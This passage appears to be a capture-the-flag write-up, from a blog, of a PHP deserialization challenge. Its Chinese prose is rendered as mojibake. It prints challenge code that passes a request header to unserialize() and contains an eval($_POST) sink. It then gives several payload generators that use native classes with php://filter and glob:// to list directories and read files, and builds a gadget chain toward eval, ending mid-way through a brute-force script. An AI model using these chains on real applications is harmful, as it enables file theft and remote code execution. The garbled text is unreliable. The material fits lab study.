·ä¸€æ¥ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œ__wakeupé­”æœ¯æ–¹æ³•å°±ä¸ä¼šè§¦å‘ï¼Œç®€å•æ¥è¯´å°±æ˜¯wakeupåªå¯¹å¯¹è±¡æœ‰æ•ˆ</p><h1 id="2023æ„šäººæ¯è¢«é—å¿˜çš„ååºåˆ—åŒ–"><a href="#2023æ„šäººæ¯è¢«é—å¿˜çš„ååºåˆ—åŒ–" class="headerlink" title="2023æ„šäººæ¯è¢«é—å¿˜çš„ååºåˆ—åŒ–"></a>2023æ„šäººæ¯è¢«é—å¿˜çš„ååºåˆ—åŒ–</h1><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;check.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;text == <span class="hljs-string">&quot;aaaa&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">lcfirst</span>(<span class="hljs-variable">$this</span>-&gt;text);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$kk</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> cycycycy;<br>        <span class="hljs-variable">$a</span> -&gt; <span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>];<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">cipher</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$get</span> === <span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;eval&quot;</span>]);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a_a</span> = <span class="hljs-variable language_">$this</span> -&gt; a;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a_a\$&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;   <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="hljs-variable">$this</span> -&gt; key))&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span> -&gt; file);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸è¡Œå“¦&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;aaa;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; aaa = <span class="hljs-keyword">clone</span> <span class="hljs-keyword">new</span> EeE;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_AAAAAA&quot;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_ip</span>);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯é€šè¿‡headerå¤´ä¼ å‚çš„ æ¯”è¾ƒæ–°å¥‡</p><p>å¥½å¤šå‡½æ•°æ²¡å®šä¹‰è‚¯å®šå…ˆè¦è¯».txtæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$eeee</span>=<span class="hljs-string">&quot;-_-&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;name))&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">coos</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span> -&gt; file))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;coos-&gt;name;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$aa</span> = <span class="hljs-variable language_">$this</span>-&gt;coos;<br>            <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;file;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$aa</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»ä¸­cooså’Œfileéƒ½å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨phpåŸç”Ÿç±»æ¥è¯»å–æ–‡ä»¶</p><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p>GlobIterator ç±»ä¹Ÿå¯ä»¥éå†ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œä½†ä¸ä¸Šé¢ç•¥ä¸åŒçš„æ˜¯å…¶è¡Œä¸ºç±»ä¼¼äº <a href="https://so.csdn.net/so/search?q=glob&spm=1001.2101.3001.7020">glob</a>()ï¼Œå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ã€‚</p><p>å®ƒçš„ç‰¹ç‚¹å°±æ˜¯ï¼Œåªéœ€è¦çŸ¥é“éƒ¨åˆ†åç§°å°±å¯ä»¥è¿›è¡Œéå†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;*txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;GlobIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°æ–‡ä»¶ååŠ <code>h1nt.txt</code></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p>æ‹¿åˆ°æ–‡ä»¶åé‚£æˆ‘ä»¬ç›´æ¥ä½¿ç”¨SplFileObjectåŸç”Ÿç±»ç›´æ¥è¯»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯åªæœ‰</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250122162120344.png" alt="image-20250122162120344"></p><p>åº”è¯¥æ˜¯æ³¨é‡Šæ‰äº†ï¼Œä½¿ç”¨ä¼ªåè®®è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>è§£ç åå¾—åˆ°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#ç”¨äºcheck.php</span><br><br><span class="hljs-attribute">key</span>ï¼šqwertyuiopasdfghjklzxcvbnm123456789<br><br><span class="hljs-attribute">move</span>ï¼š<span class="hljs-number">2</span>~<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p><p>å°è¯•ä½¿ç”¨åŸç”Ÿç±»æ‰«ç›®å½•è¯•è¯•</p><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h2><p><code>glob:///f*</code>ï¼Œè¿™æ˜¯ä¸€ä¸ª PHP çš„æµåŒ…è£…å™¨ï¼Œç”¨äºåŒ¹é…æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰få¼€å¤´çš„æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;glob:///f*&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;DirectoryIterator&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°flagçš„æ–‡ä»¶æ˜¯f1agaaa</p><p>ä½¿ç”¨ä¼ªåè®®è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=f1agaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span> = <span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$e</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$e</span>);<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><p>å®˜æ–¹wpæ˜¯flagæ–‡ä»¶æ˜¯ä¸çŸ¥é“çš„è¦ç»“åˆç»™å‡ºçš„keyå’Œmoveå»çˆ†ç ´</p><p>å®˜æ–¹è§£é‡Šï¼š</p><p>å…¶ä¸­moveæ˜¯ç§»åŠ¨çš„æ„æ€ï¼ŒçŒœæµ‹è¿™æ˜¯ä¸€ä¸ªç§»ä½çš„åŠ å¯†ï¼Œå…¶ä¸­çŒœæµ‹keyæ˜¯èŒƒå›´é‚£ä¹ˆå°±æœ‰å‘å·¦å°±æœ‰3ç§å¯èƒ½ï¼Œ å‘å³ä¹Ÿæœ‰3ç§å¯èƒ½ ä½†æ˜¯æç¤º2æç¤ºæˆ‘ä»¬random-éšæœºï¼Œé‚£ä¹ˆåŠ å¯†å¯èƒ½æ˜¯2~7éšæœºï¼Œé‚£ä¹ˆæ¯æ¬¡æ­£å¥½ç›¸ç­‰å°±æ˜¯1&#x2F;24çš„å‡ ç‡</p><p>ä¹‹åå°±æƒ³åŠæ³•æ„é€ é“¾å­è§¦å‘åˆ©ç”¨<code>eval</code>å‡½æ•°äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EeE</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eeee</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cycycycy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">EeE</span>();<br><span class="hljs-variable">$a</span> -&gt;text = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$a</span> -&gt;text -&gt;coos -&gt;aaa = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cycycycy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:1:&quot;1&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:8:&quot;cycycycy&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:4:&quot;eeee&quot;;N;&#125;</span><br><br></code></pre></td></tr></table></figure><p>ä¹‹åç”¨è„šæœ¬çˆ†ç ´keyå°±å¯ä»¥äº†ï¼Œè´´ä¸€ä¸ªå®˜æ–¹çš„è„šæœ¬ <strong>æ²¡æ‡‚</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>mi = [<span class="hljs-string">&#x27;i6xstx6d6x6ir&#x27;</span>,<span class="hljs-string">&#x27;u5zarz5s5z5ue&#x27;</span>,<span class="hljs-string">&#x27;y4lpel4a4l4yw&#x27;</span>,<span class="hljs-string">&#x27;sqnhonqjqnqsi&#x27;</span>,<span class="hljs-string">&#x27;dwmjpmwkwmwdo&#x27;</span>,<span class="hljs-string">&#x27;fe1ka1ele1efp&#x27;</span>]<br>d = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> d&lt;<span class="hljs-number">2</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 